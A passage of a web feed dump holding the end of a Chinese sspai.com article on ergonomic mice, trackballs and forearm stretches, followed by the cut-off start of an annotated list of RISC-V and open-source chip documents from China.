src=\"https://cdn.sspai.com/editor/u_/c5ai2gdb34teh5fkvc60.png\"><figcaption>从左至右：前屈、后伸、外展与内收、内旋、外旋，图源：sequencewiz.com</figcaption></figure><p>由于这种活动限制的存在，我们生活中需要进行的各种动作往往需要动用多个关节，而相应地，同一个动作，经常也可以靠不同的关节活动达成。拿「移动鼠标」这件事来说，你可以固定肩膀、肘部，仅靠手腕或手指完成活动；也可以减少手腕和手指的活动，选择手肘或是肩膀运动来带动鼠标。借用游戏玩家的术语，这就是常说的所谓的「<strong>手腕流</strong>」和「<strong>手臂流</strong>」。与此相关的，还有一个很著名的论点：</p>\n<blockquote><p>（FPS）职业选手手臂流居多。</p></blockquote>\n<p>职业游戏玩家可以视作极端化的一般办公室人群，他们使用鼠标更加频繁、幅度更大、更需要长时间、高精准度的操作。而当谈及采用手臂流的原因时，讨论大多就指向了「精准度」——由于手指和手腕的活动范围较小，玩家不得不把灵敏度提高以进行大角度转向，这样手部的小幅震颤也会加倍地体现在准星上；相应地，手臂流玩家就可以采用更大的活动幅度以及更低的灵敏度。</p>\n<p>但职业选手之所以采用「手臂流」，或者说用肘关节和肩关节完成大幅度移动，除去个人习惯的偏好外，还有一部分原因和手部健康脱不开干系。</p>\n<p>在此，我需要引入一个概念：「<strong>中立位</strong>（neutral position）」。</p>\n<p>所谓中立位，指的是每个关节的静止位置。当关节相关的神经、肌腱、肌肉和骨骼都处在最小张力或压力状态下时，关节自然处在的默认位置即为「中立位」。<sup class=\"ss-footnote\" href=\"https://health.uconn.edu/occupational-environmental/wp-content/uploads/sites/25/2016/01/workstation_adjustment.pdf\" title=\"https://health.uconn.edu/occupational-environmental/wp-content/uploads/sites/25/2016/01/workstation_adjustment.pdf\" footnote-id=\"2\">2</sup> 这种状态下的肌肉可以最有效地发力，关节在这一位置造成的磨损也最小。</p>\n<p>上世纪 80 年代前，NASA 在 Skylab 上完成了对 12 名宇航员在微重力环境下完全放松的自然姿势的测量，这为后续人体工学设备的设计提供了重要依据。这一姿势被称作<strong>中立体态</strong>（Neutral Body Posture，NBP）。当然，在重力环境下，我们的具体数值可能略有不同，比如肘关节的屈曲范围可达 0~135°/150°，但中立位在 90°~110° 之间。但上肢部分的姿态基本一致：上臂略展，肘关节屈曲，手部中线与前臂中线同轴，手指自然弯曲。后续各种人体工学设备的设计思路也基本都遵循了维持中立体态的原则，包括此前讨论过的 <a href=\"https://sspai.com/post/67354\" target=\"_blank\">人体工学键盘</a>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2glb34teh3cl8k60.png\"><figcaption>图源：<a href=\"https://spinoff.nasa.gov/Spinoff2013/t_4.html\" target=\"_blank\">NASA Spinoff</a></figcaption></figure><p>对于惯用手腕活动鼠标的人来说，在进行大范围移动时，手腕需要反复左右弯折（桡偏与尺偏），而这两个动作的最大活动范围相加，只有 50° 上下，何况移动半径只有手掌的长度。这样的动作向上移交给肩关节和肘关节后，却可以分解为屈肘、展肩这样对关节来说没什么负担的动作。同时，完成这些动作所需的肌肉也不会受到过分牵拉，神经、肌腱等结构也能在一个合适且安全的范围内活动。</p>\n<p>人体的自适应机制比较强大，如果感到不适，动作也会自动进行调整。逐渐地，依靠手臂瞄准也就成了一种大范围现象。FPS 职业选手比例尤其高，主要还是因为对快速拉枪等高速运动的需求更多，单纯使用手腕的伤害更大，大幅度动作就自然地向手臂肌肉移动，只留下小范围微调由手腕控制。</p>\n<h2>什么样的鼠标能减轻手部疲劳？</h2>\n<p>人体是一副精妙的机器。我们全身上下的骨骼、肌肉、神经等等组织器官共同构成了这套复杂的系统。问题在于，它和诸多器械一样，不按照最合适的方式使用与维护，就会加速磨损，最终造成功能和结构的损伤。</p>\n<p>长期坐办公室的朋友可能遇到过或大或小的手部问题。有人可能手指酸胀、麻木；有人在活动关节时疼痛、弹响；有一些更严重的，在不活动时手掌也开始疼痛，甚至在夜间痛醒。考虑到办公室发放/配备的鼠标很有可能是尺寸偏小的对称鼠标，这些疼痛与不适就更像是身体对不当工作姿势和劳作强度提出的严正抗议（，最严重的那种已经称得上是起义了）。大部分的不适都可以在足量的休息后恢复，但如果你的工作限制了你的休息空间，选择合适的鼠标和键盘、采用更健康的姿势，可以大大延缓这些职业劳损的发生。</p>\n<h3>从对称鼠到垂直鼠</h3>\n<p>很多人在使用对称鼠时并没有感受过太明显的不适，其实是因为在不需要精准操作时，手臂会自己调整到一个舒服的姿态，以更符合自然角度的模式搭在鼠标上，而你可能并没有意识到。</p>\n<figure class=\"ss-imgRows\" figcaption=\"完全放松使用对称鼠标，手部也会自然摆出倾斜的姿势。\"><img src=\"https://cdn.sspai.com/2021/09/30/1f1a6f60c33cef6405d3432588f28935.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/30/93cf472e2da2f4cc1a7b02a89b3407cc.jpg\" alt=\"\"></figure><p>这样的休息姿势并不方便控制鼠标，只能做做简单的点击。对于需要长时间高精准使用鼠标的群体来说，比起让身体调整，更好的方法是让鼠标外形发生变化，让它为使用者提供一个可以自然搭握的外形，既能方便地握紧，又能减少手腕、手臂扭转带来的肢体压力。</p>\n<p>这就是人体工学鼠标的基本目的。而设计这样的鼠标，最简单的方法就是把处在自然放松状态下的小臂转到桌面上。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2gtb34teit0pmpc0.jpeg\"><figcaption>Evoluent Vertical Mouse 4，图源：<a href=\"https://www.ergonomicessentials.com.au/blog/why-are-evoluent-vertical-mice-so-popular/\" target=\"_blank\">ErgonomicEssentials</a></figcaption></figure><p>很多经典的办公工学鼠标都选择了这样的策略，这一类型的鼠标常常被称作「垂直鼠标」。一般认为最早的人体工学鼠标就是 Jack Lo 在 1994 年发明的「握手握法」鼠标 Evoluent，这是第一款为全手掌提供竖直支撑的鼠标。</p>\n<p>竖直设计的鼠标最直观的效果就是能让趴在桌面上的手腕和前臂以一个自然的角度稍稍悬空，直接减轻外界压力，同时可以方便活动。此后，越来越多的品牌依循类似的思路，开发了各式各样的人体工学鼠标模具。</p>\n<h4>罗技 MX Vertical</h4>\n<p>罗技在办公室外设上投入的心血是很多品牌难以比拟的，毕竟不是每个办公室外设厂商都会建立人体工学实验室。MX Vertical 作为 Ergo 系列的经典产品，在保证外观设计符合人体工学的基础上，搭载了罗技的优联技术，并且支持罗技 Flow，可以多设备跨屏使用。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2h5b34teh5fkvc6g.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2hdb34teit0pmpcg.jpeg\" alt=\"\"></figure><p>MX Vertical 是我用过一段时间的鼠标，外观设计和选料都让人爱不释手。但它相对无强制手指定位的设计可能在握持时造成一定的误解。刚开始使用的一两天里，我始终感觉这款鼠标定位不准，后来发现是我的握姿不对——虎口并不是紧贴在弧度最明显的点位的，手指也不用僵硬地伸直。如上图所示，这款鼠标俯视时显得很扭曲，是因为顶部越收越窄，最终收在一个偏左的位置，符合了手部自然状态时类似握手的状态。正确的握姿是手放松地搭在宽大的底盘稍上，手指无需伸直，自然蜷曲时，虎口位置低且斜，停在弧度最明显位置的其实是食指根部。在调整了自己的握姿后，定位也正常了，手也更加舒适，小臂的酸痛都少了一些。</p>\n<h4>山业 Sanwa Supply 人体工学系列</h4>\n<p>来自日本的山业其实生产了不少符合人体工学设计的竖直鼠标，不知道什么原因，他们总是被大家遗忘，只能怪中文名太不响亮了。由于配色克制、设计经典，山业的鼠标常常成为其他厂商翻模山寨的对象。其中最经典的，莫过于带腕托的 MA-ERGW6。</p>\n<figure class=\"ss-imgRows\" figcaption=\"图：Sanwa Supply 官网，左 MA-ERGW6，右 400-MA059\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2hlb34teit0pmpd0.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2htb34teh0gc1cg0.png\" alt=\"\"></figure><p>与 MX Vertical 相比，山业各个型号的鼠标外形都更加远离常规印象中的「鼠标」，除了 MA-ERGW6 这种带腕托的大块头之外，还有 400-MA059 这种取消了主按键、以晃动代替点击、从而做到左右手可通用的绝对异类（可惜已经停售）。比起附带了更多利于办公的技术的罗技，山业就像是老老实实的匠人，一门心思在模具上下工夫。</p>\n<h4>微软 Sculpt Ergonomic</h4>\n<p>之前在 <a href=\"https://sspai.com/post/67355\" target=\"_blank\">少数派员工用什么外设</a> 的文章里，我提到过这个圆滚滚的大馒头。虽然和上面提到的这些实打实的竖直鼠标有些差别，但实际体验上，它在手部支撑的饱满程度上基本可以归为一档。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2htb34teit0pmpdg.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2i5b34teh3cl8k6g.png\" alt=\"\"></figure><p>微软在人体工学外设方面同样耕耘多年。这支昵称「大馒头」的鼠标在近几年微软的新模具中最引人注目。虽然外表看起来像闹着玩一样，但它对手掌的支撑是实打实的好。对于目前那些办公室桌椅高度不合适又不可调的群体来说，这个整体高度稍稍有些离谱的鼠标反而可以在大部分桌面保证使用者的手腕足够悬空不被压迫，同时手掌受到足够支撑不至于太累。虽然外形和之前的两个品牌差别巨大，实际体验上，Sculpt Ergonomic 的握感还是更接近竖直鼠标，饱满，手部更直立，手腕压迫小。</p>\n<h3>在舒适与易用中平衡</h3>\n<p>还有一类「人体工学鼠标」，在外形上就没有这么激进，它们更多地是在保留过往使用习惯和操控灵活度的基础上，对右手支撑进行适配。游戏玩家更容易接受这类鼠标。我习惯把它们笼统地称为「人体工学游戏鼠标」，罗技的 G403 系列模具、雷蛇当家的蝰蛇系列模具、ZOWIE 的 EC 系列，都是经典的右手人体工学鼠标。</p>\n<figure class=\"ss-imgRows\" figcaption=\"左：罗技 G403，右：ZOWIE EC2\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2idb34teh3cl8k70.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2ilb34teit0pmpe0.png\" alt=\"\"></figure><p>通常来说，竖直鼠标由于外形比较怪异，和常规使用鼠标的姿势差别过大，购买者往往是对鼠标的精准度要求不高但使用频次高的办公室人群。这也使得竖直鼠标的厂商更倾向于选择那些适合在各种平面使用的引擎，最有代表性的就是微软的蓝影，在办公鼠标界撑起一篇天的各型号激光引擎也是这样，我把这些硬性能比较落后的引擎统称为「办公引擎」。</p>\n<p>办公鼠标引擎的问题就是不适合游戏，尤其是 FPS 游戏。由于追踪速度和传感器帧率这两项指标的落后，激光引擎和蓝影可以做到「精准」，但它的精准只在慢速下成立。快速滑动使用了办公引擎的鼠标导致的丢帧可能会带来画面的抽搐、快速闪动、不跟手等等游戏体验上的意外，有可能导致眩晕——至少我疯狂选购外设的道路就是从这里开始的。</p>\n<p>这一类型的鼠标我在 <a href=\"https://sspai.com/post/66327\" target=\"_blank\">游戏鼠标指南</a> 一文之中有过介绍。单就人体工学的舒适程度这一方面来说，这类鼠标的实际效果较小，顶多相当于让你的手处在「使用对称鼠时拿来休息的位置」。但如果你平常游戏玩得很多，而且不打算把办公和游戏的鼠标分开，这样的人体工学鼠标其实也是不错的选择。它最大的特点，就是有大量厂商使用了性能足够强劲的<strong>光电鼠标引擎</strong>，保证各方面性能都跟得上时代主流。具体购买时，可以对照我在游戏鼠标指南的文章中提到的选购原则。一定要注意手长。对于需要打游戏的使用者来说，尺寸的宽容度会变小，因为在需要仔细瞄准时，人会下意识抓紧鼠标，再加上手汗带来的影响，过大和过小的尺寸都会让手更加紧张。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2itb34teh3cl8k7g.jpeg\"><figcaption>比如我用的 MM720 和 ROG 月刃，对平均手来说就小了一些，分别代表了强制人体工学和一般人体工学两种设计。</figcaption></figure><h3>另辟蹊径的选择</h3>\n<p>如果你对这些都不感兴趣，或许可以试试别的指点设备。即使桌面够大、不需要使用专业软件，<strong>轨迹球</strong>也是一个不错的选择。</p>\n<p>既然鼠标的活动方式会让你的手腕不适，前臂麻木，那干脆不要在桌面上移动鼠标。轨迹球的设计给了足够的手部调整空间。手指用累了用手掌，右手用累了换左手。</p>\n<h4>Kensington 轨迹球</h4>\n<p>在这个几乎所有公司都要停产轨迹球设备的年代，Kensington 依旧屹立如初。作为可能是目前最大的轨迹球生产商，Kensington 提供了各式各样的轨迹球设计，有线无线、腕托按键、四指或拇指，只要想要，基本都有。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2j5b34teh3cl8k80.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2jdb34teit0pmpeg.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2jlb34teit0pmpf0.png\" alt=\"\"></figure><h4>罗技 MX Ergo</h4>\n<p>罗技也是少数尚未停产轨迹球产品的厂商之一。MX Ergo 和 Ergo M575 是 Ergo 系列中现在还在售的轨迹球型号。两者的设计思路基本一致，最大的差别在于 MX Ergo 支持额外的角度调整。相比只能平趴的 M575，MX Ergo 允许使用者斜向抬起最大 20°，进一步贴合手臂角度。但这两款都是拇指轨迹球，对于一部分用户来说可能需要<strong>谨慎选择</strong>。由于这种设计限制了轨迹球只能由右手拇指操作，大量使用拇指也可能影响拇指的健康，选择时需要参考自己的使用习惯。</p>\n<figure class=\"ss-imgRows\" figcaption=\"左：罗技 MX Ergo，右：罗技 Ergo M575\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2jtb34teh5fkvc70.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2k5b34teit0pmpfg.png\" alt=\"\"></figure><h2>更换设备也不能忘记放松</h2>\n<p>工学鼠标推荐了不少，这些类型的鼠标都可以让你的工作生活稍微少一点点疲劳，即使没直接看到自己心仪的型号，联系之前的鼠标选购指南，相信你也能知道选购适合自己的鼠标的方法。可说到底，它们仍然是工作用品。鼠标的舒适，只能让你的疲劳和损伤来得慢一点、轻一点，如果不进行日常的保护和拉伸，选择工学鼠标也不能让你逃离被劳损找上门的命运。</p>\n<p>可能有人会说，自己的对称鼠标也用得挺好，没觉得会造成损伤。但这涉及的其实是几个方面平衡的问题：<strong>鼠标重量</strong>，<strong>个人体质</strong>，和<strong>鼠标外形</strong>。如果鼠标的造型对手腕和手臂不甚友好，它就要做到足够轻，来减小你移动鼠标时对手腕和手臂造成的冲击；如果鼠标的外形合适，它的重量就可以大一些。近来游戏鼠标的轻量化、无线化趋势其实也是这个道理：对称鼠标更适合快速移动、操作更加敏捷，也就是所谓的「跟手」，但想要让它对你的身体结构友好，它就要轻到让你注意不到使用时胳膊承受的拉伸。但更早些时候，鼠标总是做重来凸显高级，鼠标「越重越稳」的错误观念也还是在消费者的脑子里植根，这种观念下选择的超重鼠标其实是在赌自己的体质足够刚猛——疼痛发生的那一刻前，你永远不会觉得它有问题。</p>\n<p>此外需要额外提及一点：鼠标最好不要随意使用腕托。如果你的鼠标没有放在比较低的位置，甚至已经需要弯折手腕使用鼠标的情况下，加一个腕托不仅不会缓解疲劳，反而会因为对手腕造成压迫进一步加重腕部不适。真正有效的鼠标腕托需要配合正确的高度、正确的姿势并给予人体工学的设计，那种便宜的海绵腕托提供的柔软感觉非常具有欺骗性，给你的是虚假的舒适。悬空的疲惫也好过压迫的危险。</p>\n<p>在一篇关于「重复性劳损」（RSI，repetitive strain injury）的文章中，作者提出，RSI 这个名词本身就过于笼统，覆盖了太多的与职场相关的上肢疼痛，并不是一个良好的医学术语。而目前的研究看来，对于受到「RSI」侵扰的上班族来说，最难的就是证明这种疼痛与职场状态的关联。</p>\n<p>但同样，文章也指出，这些疼痛、病变等在很大程度上与对神经、血管、肌肉有影响的动作相关，包括过度拉伸、震动等。矿工、学生、网球运动员、高尔夫球运动员等常见的肘部职业病就是比较典型的例子。长期坐在桌前、缺乏运动的办公人士，即使生理上没有产生病变，心理变化也可能造成身体感知的异常。所以，即使更换了设备，最好还是定期活动拉伸手臂，多方位防护才能避免异常疼痛的发生。</p>\n<h3>Mayo Clinic 推荐的前臂拉伸法</h3>\n<p>接下来介绍的这种拉伸方法十分简单，但确实有效。在工作前与长时间工作后进行拉伸，可以让你的前臂提前进入活动状态，并在几乎固定的工作后得到放松。你可以前往 <a href=\"https://www.mayoclinic.org/healthy-lifestyle/adult-health/multimedia/forearm-stretches/vid-20084698\" target=\"_blank\">Forearm stretches for the workplace</a> 观看指导视频，以下图片均来自 Mayo Clinic 视频截图，当然了，这些动作非常简单，只阅读文字描述就可以标准地做好。</p>\n<p>在整个拉伸过程中，保持正常呼吸，不要憋气。动作轻柔，如果你感到疼痛，说明你的动作太大了。</p>\n<h4>第一步</h4>\n<p>自然抬起一支手臂，手腕自然下垂。另一只手将下垂的手向内拉伸，感觉上臂有「肌肉拉伸」的感觉即可，保持 15 秒。之后换手，重复。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2kdb34teh5fkvc7g.png\"></figure><h4>第二步</h4>\n<p>自然抬起一支手臂，这次手掌向上。另一只手将抬起的手向内拉伸，感觉上臂有「肌肉拉伸」的感觉即可，保持 15 秒。之后换手，重复。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2ktb34teh3cl8k8g.png\"></figure><h4>第三步</h4>\n<p>双臂平举放松，两只手缓慢绕手腕向内旋转，活动 15~30 秒后，换方向向外旋转，重复。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2l5b34teh0gc1cgg.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c5ai2llb34teit0pmpg0.png\" alt=\"\"></figure><p>其他部位的拉伸也推荐每日重复。</p>\n<p>希望你在工作中保持健康，不会遭受疼痛的困扰。</p>\n<h4>相关参考</h4>\n<p>Helliwell PS, Taylor WJ. Repetitive strain injury. <i>Postgraduate Medical Journal</i> 2004;80:438-443.</p>\n<p>UCSF, Maintain a Neutral Posture, https://ehs.ucsf.edu/maintain-neutral-posture</p>\n<p>Mayo Clinic, <a href=\"https://www.mayoclinic.org/healthy-lifestyle/adult-health/multimedia/forearm-stretches/vid-20084698\" target=\"_blank\">Forearm stretches for the workplace</a> (Video)</p>\n<p>身体各部位中立位：University of Wisconsin System, <a href=\"https://www.wisconsin.edu/ehs/osh/ergonomics-2/maintaining-neutral-postures/\" target=\"_blank\">Maintaining Neutral Postures</a></p>\n<p>Cornell University Ergonomics Web, <a href=\"https://ergo.human.cornell.edu/cumousetips.html\" target=\"_blank\">CUergo: 10 Tips for Mouse Use</a></p>\n<h4>关联阅读</h4>\n<ul>\n<li><a href=\"https://sspai.com/post/66327\" target=\"_blank\">用过 30 多款游戏鼠标后，我想聊聊如何筛选到趁手利器</a></li>\n<li><a href=\"https://sspai.com/post/68599\" target=\"_blank\">办公室与宿舍的防刺杀装备：静音键鼠详解</a></li>\n<li><a href=\"https://sspai.com/post/67355\" target=\"_blank\">少数派员工的桌面长啥样——键鼠外设用些啥？</a></li>\n<li><a href=\"https://sspai.com/post/67354\" target=\"_blank\">手腕救星还是烧钱摆件？聊聊人体工学键盘</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69064"},{"title":"4年21份资料10万字：记录RISC-V在中国的一条轨迹","date":"2021-10-05 16:37:31","description":"\n<blockquote>作者： 中科院计算所研究员 包云岗</blockquote>\n<p><b>过去4年，我们团队在开源芯片和RISC-V领域撰写了21份材料，总计超过十万字，记录了我们在这个领域的一些思考和进展。当然，我们的工作只是RISC-V在中国快速发展的一条轨迹而已。如今，RISC-V在中国得到越来越多的关注和投入，越来越多的出色成果涌现出来，前景可期。过去4年，我们在梳理这些资料的过程中，对开源芯片、敏捷设计、RISC-V的认识与理解不断深入。这让我们在开源芯片方向上更加坚定，更充满信心。趁国庆假期，把近4年来团队撰写的这21份资料做了一个汇编，并对每一份资料加上一小段注解，与大家分享。希望能对大家了解开源芯片与RISC-V有一些帮助。</b></p>\n<hr>\n<h2>\n<b>（1）2017年12月：《</b><a href=\"https://link.zhihu.com/?target=http%3A//blog.sciencenet.cn/blog-414166-1089206.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">关于RISC-V成为印度国家指令集的一些看法</a><b>》</b>\n</h2>\n<p>这篇文章是11月28日从海南回北京的飞机上手写完成初稿（见下图），尔后整理发表于《中国计算机学会通讯》2018年第1期，是国内最早系统性介绍RISC-V的文章。这篇文章得到网信办、工信部等多个部门的关注和重视，组织了多次专题研讨，推动了中国开放指令生态（RISC-V）联盟的成立。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f9420cb82718c10d54de1c04fa902aaa_b.jpg\" data-rawwidth=\"2462\" data-rawheight=\"754\" data-size=\"normal\" data-caption=\"\" class=\"origin_image zh-lightbox-thumb\" width=\"2462\" data-original=\"https://pic3.zhimg.com/v2-f9420cb82718c10d54de1c04fa902aaa_r.jpg\"></figure><h2>\n<b>（2）2018年10月：</b><a href=\"https://link.zhihu.com/?target=http%3A//crva.ict.ac.cn/documents/RISC-V-Reader-Chinese-v2p1.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">《RISC-V 手册》中文版</a>\n</h2>\n<p>这是《RISC-V Reader》的中文翻译版本，由勾凌睿、黄成、刘志刚三位同学完成翻译，其中勾凌睿和刘志刚后来也成为了开源高性能RISC-V处理器“香山”的主力成员。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-89f5ea40d946459d9678d7cc1d088dc3_b.jpg\" data-rawwidth=\"727\" data-rawheight=\"372\" data-size=\"normal\" data-caption=\"\" class=\"origin_image zh-lightbox-thumb\" width=\"727\" data-original=\"https://pic4.zhimg.com/v2-89f5ea40d946459d9678d7cc1d088dc3_r.jpg\"></figure><h2>\n<b>（3）2019年1月：《</b><a href=\"https://link.zhihu.com/?target=http%3A//acs.ict.ac.cn/baoyg/downloads/Agile-Chip-Design.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">芯片敏捷开发实践：标签化RISC-V</a><b>》</b>\n</h2>\n<p>这篇文章记录了我们团队从2013年7月选择开源的OpenSparc T1开始，如何一步步探索最终选择RISC-V。这个过程中我们也开展基于Chisel的处理器芯片敏捷开发方法的实践，进行了一系列Chisel与Verilog的量化对比实验，为我们后来选择Chisel作为开发语言提供了依据。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-1882a01b725433389c1425fa64575f4b_b.jpg\" data-rawwidth=\"490\" data-rawheight=\"562\" data-size=\"normal\" data-caption=\"\" class=\"origin_image zh-lightbox-thumb\" width=\"490\" data-original=\"https://pic4.zhimg.com/v2-1882a01b725433389c1425fa64575f4b_r.jpg\"></figure><h2>\n<b>（4）2019年2月：</b><a href=\"https://link.zhihu.com/?target=http%3A//crva.ict.ac.cn/documents/OpenISA-OpenSourceChip-Report.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">《开放指令集与开源芯片 发展报告 》白皮书</a>\n</h2>\n<p>2018年11月8日，中国开放指令生态（RISC-V）联盟（以下简称CRVA联盟）在乌镇世界互联网大会正式成立。CRVA联盟随后成立了调研工作组，结合联盟成员的最新实践，形成了这份白皮书，系统介绍了当时开放指令集与开源芯片的国内外发展态势，梳理开源芯片生态与芯片敏捷开发现状与未来面临的挑战与机遇。该白皮书在业界产生了积极影响。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-192c459489b636292bba4f253a1d8cf9_b.jpg\" data-rawwidth=\"932\" data-rawheight=\"720\" data-size=\"normal\" data-caption=\"\" class=\"origin_image zh-lightbox-thumb\" width=\"932\" data-original=\"https://pic2.zhimg.com/v2-192c459489b636292bba4f253a1d8cf9_r.jpg\"></figure><h2>\n<b>（5）2019年2月：《</b><a href=\"https://link.zhihu.com/?target=http%3A//blog.sciencenet.cn/blog-414166-1163127.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">降低芯片设计创新门槛——从互联网成功经验看开源芯片生态发展</a><b>》</b>\n</h2>\n<p>这篇文章分析开源软件对中国互联网发展的两大重要意义：一是降低了创新的门槛，二是摆脱了技术上的受制于人。进而呼吁在芯片领域重视开源模式，并提出畅想——如果全世界也拥有了价值上百亿美元的开源芯片设计所需的EDA工具链、IP模块、工艺库等，那么芯片领域的创新将会像今天的互联网那样层出不穷；当芯片开发周期能从数年缩减为几个月，那将形成一种软硬件协同的敏捷开发模式（如下图），这将颠覆现在的IT产品开发模式。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-f04f35e93cecfe82451cc85f388b78e2_b.jpg\" data-rawwidth=\"610\" data-rawheight=\"326\" data-size=\"normal\" data-caption=\"\" class=\"origin_image zh-lightbox-thumb\" width=\"610\" data-original=\"https://pic3.zhimg.com/v2-f04f35e93cecfe82451cc85f388b78e2_r.jpg\"></figure><h2>\n<b>（6）2019年5月：《</b><a href=\"https://link.zhihu.com/?target=http%3A//crva.ict.ac.cn/documents/A-Report-on-the-Risks-and-Suggestions-of-Open-Source-Projects.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">开源项目风险分析与对策建议</a><b>》</b>\n</h2>\n<p>2019 年5月15日，华为被美国商务部列入“实体名单”。同时国内各界也开始重视开源项目的法律约束问题。CRVA联盟组织了工作组，针对 12 个知名开源基金会、6 个常用开源许可证和 3 个代码托管平台进行了调研，分析它们在出口管制、司法管辖权和开源许可证下受到的约束以及潜在风险，形成了一份报告。该报告得出两条重要结论：（一）开源项目本身可以规避出口管制；（二）代码托管平台会受到出口管制。因此呼吁我国需加快开源代码托管平台建设。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-ce58639ce8009523048e8cca36144d68_b.jpg\" data-rawwidth=\"520\" data-rawheight=\"740\" data-size=\"normal\" data-caption=\"\" class=\"origin_image zh-lightbox-thumb\" width=\"520\" data-original=\"https://pic1.zhimg.com/v2-ce58639ce8009523048e8cca36144d68_r.jpg\"></figure><h2>\n<b>（7）2019年6月：</b><a href=\"https://link.zhihu.com/?target=http%3A//crva.ict.ac.cn/documents/Comments-on-Risks-of-Open-Source-Projects.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">《开源项目风险分析与对策建议》报告解读</a>\n</h2>\n<p>为了方便读者更好地理解报告，CRVA联盟工作组发布了一份44页的解读PPT，补充了诸多具体案例。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-cdac555111f6d64f1ffe40c9b6cb3f84_b.jpg\" data-rawwidth=\"695\" data-rawheight=\"491\" data-size=\"normal\" data-caption=\"\" class=\"origin_image zh-lightbox-thumb\" width=\"695\" data-original=\"https://pic1.zhimg.com/v2-cdac555111f6d64f1ffe40c9b6cb3f84_r.jpg\"></figure><h2>\n<b>（8）2019年7月：《</b><a href=\"https://link.zhihu.com/?target=http%3A//news.sciencenet.cn/sbhtmlnews/2019/7/347671.shtm\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">驳“发展开源芯片弊大于利”论</a><b>》</b>\n</h2>\n<p>这是发表在《中国科学报》上的一篇短评文章。当时有一些“发展开源芯片弊大于利”的声音，这样的观点甚至影响到开源软件的推行。这篇短评的观点是开源模式背后有市场规律在驱动，有经济学原理在支持，并基于两个经济学理论（交易成本理论与杰文斯效应）对开源进行了分析。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-3325c4a122e426cd5ff08f9c0e249733_b.jpg\" data-rawwidth=\"546\" data-rawheight=\"618\" data-size=\"normal\" data-caption=\"\" class=\"origin_image zh-lightbox-thumb\" width=\"546\" data-original=\"https://pic4.zhimg.com/v2-3325c4a122e426cd5ff08f9c0e249733_r.jpg\"></figure><h2>\n<b>（9）2019年8月：《</b><a href=\"https://link.zhihu.com/?target=http%3A//crva.ict.ac.cn/documents/SIGARCH-Visioning-Workshop-Summary-Agile-and-Open-Hardware-for-Next-Generation-Computing.pdf\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">远景研讨会纪要：面向下一代计算的开源芯片与敏捷开发</a><b>》</b>\n</h2>\n<p>2019年度的计算机体系结构远景研讨会（SIGARCH Visioning Workshop）在美国凤凰城召开，主题为“面向下一代计算的敏捷开放硬件（Agile and Open Hardware for Next-Generation Computing）”，吸引了上百位听众。报告人中大牛云集，有图灵奖得主David Patterson教授，也有多位美国工程院院士加持，还有来自MIT、Berkeley、Stanford、UCSD、Google、Nvidia、DARPA等顶尖大学、企业和政府机构的专家。这份研讨会纪要全文约12000字，共分为16节，较为全面地为读者呈现了开源芯片与敏捷设计方向的前沿动态。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-4f6e5d80991e858210eddc3a9f8b1810_b.jpg\" data-rawwidth=\"479\" data-rawheight=\"579\" data-size=\"normal\" data-caption=\"\" class=\"origin_image zh-lightbox-thumb\" width=\"479\" 